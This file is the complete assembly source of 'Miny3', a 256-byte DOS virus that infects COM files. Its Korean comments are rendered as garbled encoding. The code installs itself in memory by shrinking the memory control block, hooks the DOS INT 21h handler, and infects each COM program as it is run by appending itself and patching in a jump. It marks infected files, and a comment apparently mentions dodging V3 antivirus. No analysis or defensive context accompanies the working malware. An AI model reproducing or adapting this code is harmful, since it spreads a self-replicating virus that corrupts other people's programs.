;******************************************************************************
;*        MINY3.256 ¤a·¡œá¯a ­¡¯a                                             *
;*                                                                            *
;*                                                                            *
;*     £¡“¡3 ¯¡Ÿ¡»aº—µA Ðaa¡ Š‚¬e ¤a·¡œá¯a·¥•A ˆa¸w ‹©·¡ˆa ¼l·eˆõ·a¡ ´ia  *
;*   ¹a ·¶”a. COM  eˆqµq–A“e œ‘¬wº ¤a·¡œá¯a·¡”a.                             *
;*                                                                            *
;*                                                                            *
;*                                                                            *
;******************************************************************************


 PARASIZE      EQU     (TVirEND - Start + 0Fh) SHR 4 ; œ‘µA¬á Àa»¡Ða“e Ça‹¡

 VIRUS         SEGMENT PARA 'VIRUS'
               ASSUME CS:VIRUS, DS:VIRUS

 Start:
               call    Next                       ; ¤a·¡œá¯a ¬wºžË¥·a¡ ¸ñÏa

;**************************************************
;    ¬¡¶… 21h ¤å ·¥ÈáœóËa
;**************************************************

 NewInt21:
               xchg   ah,al                       ; AH,AL ˆt ¤aŽ‹¡
               cmp    al,4Bh                      ; ¯©Ð—·¥ˆa?
               jnz    J_Int21

               cmp    ah,30h                      ; œ‘ ¬wº µa¦ ˆñ¬a·¥ˆa?
               jnz    Push_All
               xor    ax,ax                       ;  x·a¡e 0000·i •©aº‘
               IRET

 Push_All:                                        ; A»¡¯aÈá ¸á¸w
               Pushf
               Push    ax
               Push    bx
               Push    cx
               Push    dx
               Push    ds
               Push    si

               mov     ax,3D02h                   ; Ìa·© µ¡Ïe Ða‹¡
               Int     21h
               jc      Pop_All                    ; µAœá¡e {‹¡

               push    cs                         ; CS=DS
               pop     ds
               xchg    bx,ax                      ; BX=Ìa·© Ð…—i

 Read_File:
               mov     ah,3Fh                     ; ·ª´á —i·¡‹¡
               mov     dx,offset Org4bytes        ; 4 ¤a·¡Ëa
               mov     si,dx                      ; SI=·ª·e º­¡
               mov     cx,0004h                   ; ‹©·¡
               int     21h

 ChkFileisEXE:
               cmp     byte ptr [SI],'M'          ; EXE Ìa·© ·¥ˆa?
               jz      Close_File                 ; EXE  e Ìa·© Çi¡»a

 Infect_COM:
               cmp     byte ptr [SI+3],43h        ; ˆqµqµa¦ ˆñ¬a
               jz      Close_File                 ; (V3· ‰w¶ ·¡ˆt·i ˆa»¡£a¡
                                                  ; ˆqµq´e–Q)
               mov     al,02h                     ; Ìa·©· ¹A·© –á¡
               call    Set_Pnt

               cmp     ax,1234                    ; 1234 ¥¡”a ¸b·eˆa?
               jb      Close_File
               cmp     ax,65000                   ; 65000 ¥¡”a Çeˆa?
               ja      Close_File

               sub     ax,0003                    ; Ìa·© ‹©·¡-3 = ¸ñÏaÐi ¶áÃ¡
               mov     word ptr Filehead+1,ax
               mov     byte ptr Filehead+3,43h    ; ˆqµqµa¦ ¢…¸aµi

               mov     ah,40h                     ; ¤a·¡œá¯a ³a‹¡
               mov     cx, offset VirEND          ; ‹©·¡ (256 ¤a·¡Ëa)
               xor     dx,dx                      ; ¤áÌá
               Int     21h

               mov     al,00h                     ; Ìa·©· Àá·q·a¡ ·¡•·
               call    Set_Pnt

               mov     ah,40h                     ; ¤a·¡œá¯a ³a‹¡
               mov     dx, offset FileHead        ; (´|¦¦…µA Ð”w)
               mov     cx,0004h                   ; Jump ¡wwŒa»¡ Í¡ÐqÐ¬á 4¤a·¡
               Int     21h                        ; Ëa

 Close_File:                                      ; Ìa·© ”h‹¡
               mov     ah,3eh                     ; ­¢¬÷,i¼a—w·e ˆqµq–I˜ ¤aŽå
               Int     21h                        ; ”a.

 Pop_All:                                         ; A»¡¯aÈá ¥¢Š
               Pop     si
               Pop     ds
               Pop     dx
               Pop     cx
               Pop     bx
               Pop     ax
               Popf
 J_Int21:                                         ; ¶¥œ int 21¡ ¸ñÏa
               xchg    ah,al
               DB      0EAh                       ; JMP ¡ww
 OldInt21      DD      ?

;*************************************************
; ¤a·¡œá¯a œ‘ ¬wº ÌaËa
;*************************************************
 Next:         pop     BP                         ; BPµA CALL ·¡ Ñ¡Â‰–E ”a·qˆt
               sub     bp, +03                    ; -3 Ða¡e ¤a·¡œá¯a ¯¡¸b¸ñ

               mov     AX,304Bh                   ; œ‘ ¬wº µa¦ ˆñ¬a
               xchg    ah,al                      ; AX=4B30
               Int     21h                        ;
               or      ax,ax                      ; AX ˆt·¡ 0000·¡¡e œ‘µA ¤a·¡œá¯aˆa ¹¥¸
               jz      Restart_COM                ; ·¡£¡ œ‘µA ¤a·¡œá¯aˆa ·¶·i ‰w¶

               mov     ah,0F0h                    ; ¦‰Ï©¶a
               mov     ch,'S'                     ; ¦‰Ï©¶a

               MOV     BX,ES                      ; MCB ŠÐa‹¡
               NOP
               DEC     BX                         ; -1 : Memory Control Block
               mov     ds,bx
               NOP
               xor     bx,bx                      ; BX=0000
               Inc     bl                         ; BL=01
               cmp     byte ptr [BX-1],'Z'        ;  a»¡ b §iœâ·¥ˆa?
               jnz     Restart_COM                ; ´a“¡¡e œ‘ ¬wº ´eÐq
               NOP
               mov     AX, PARASIZE               ; º‰·© œ‘ Ça‹¡
               sub     word ptr [BX+02],AX        ; §iœâ ¬a·¡»a(BX=0003)
               NOP

               sub     word ptr [BX+11h],AX       ; ”a·q ¡A¡¡Ÿ¡ §iœâ· ­A‹a åËa ¤å»¡
               mov     cl,'V'                     ; BX=0012 (mov cl,'V'“e ¦‰Ï©¶aÐq)
               mov     es,word ptr [BX+11h]       ; µ«‹© º­¡

                                                  ; Int 21h ˆa¡À‹¡
               xor     ax,ax                      ; DS=0000
               mov     ds,ax
               lds     AX, [BX+83h]               ; DI=0084h
               mov     word ptr ss:[BP+OldInt21+2],DS
               mov     word ptr ss:[BP+OldInt21],AX

               push    cs                         ; ¤a·¡œá¯aŸi ÂA¬w¶á¡ ¥¢¬aÐe”a.
               pop     ds
               mov     si,BP                      ; SI=¤a·¡œá¯a ¯¡¸b¸ñ
               xor     di,di
               mov     cx,offset TVirEND          ; µ«‹©‹©·¡
               cld
               repz    movsb                      ; ¥¢¬a

               mov     ds,cx                      ; Int 21h Ÿi Àa»¡Ðe”a.
               cli
               mov     word ptr [BX+85h],es       ;
               mov     word ptr [BX+83h],offset NewInt21
               sti

 Restart_COM:
               mov     si,BP                      ; SI = ¯¡¸b¸ñ

               push    cs
               pop     ds
               push    cs                         ; ds=es
               pop     es

                                                  ; ¶¥œ Ïa¡‹aœ‘ ¯©Ð—Ða‹¡
               add     si,offset Org4bytes        ; ¶¥œ ¡ww´áˆa ¸á¸w–E º­¡
               mov     di,0100h                   ; Àá·q· 4 ¤a·¡Ëa ¥¢Š
               push    di
               movsw                              ; ¥¢¬a
               movsw
               RET                                ; ¸¯©Ð—

               NOP
 Org4bytes     db      90h,90h,0cdh,20h           ; ¶¥œ 4 ¤a·¡Ëa· ˆt

 Set_Pnt:                                         ; ¶áÃ¡ ·¡•· ¡ww
               mov     ah,42h
               xor     cx,cx
               xor     dx,dx
               Int     21h
               RET

               DB     'Miny3'                     ; ¤a·¡œá¯a ·¡Ÿq
 FileHead      DB     0E9h                        ; JMP ¡ww
                                                  ; µa‹¡¦Èá Ìa·©µA“e ´e³aµa»±
 VirEND:                                          ; ˆqµq–I Ìa·© ´|¦¦…µA ³a·©
               DB     ?,?,?                       ; ¡ww
 TVirEND:                                         ; œ‘µA¬á ¹¥¸Ða“e ‹©·¡

 VIRUS         ENDS
               end    start
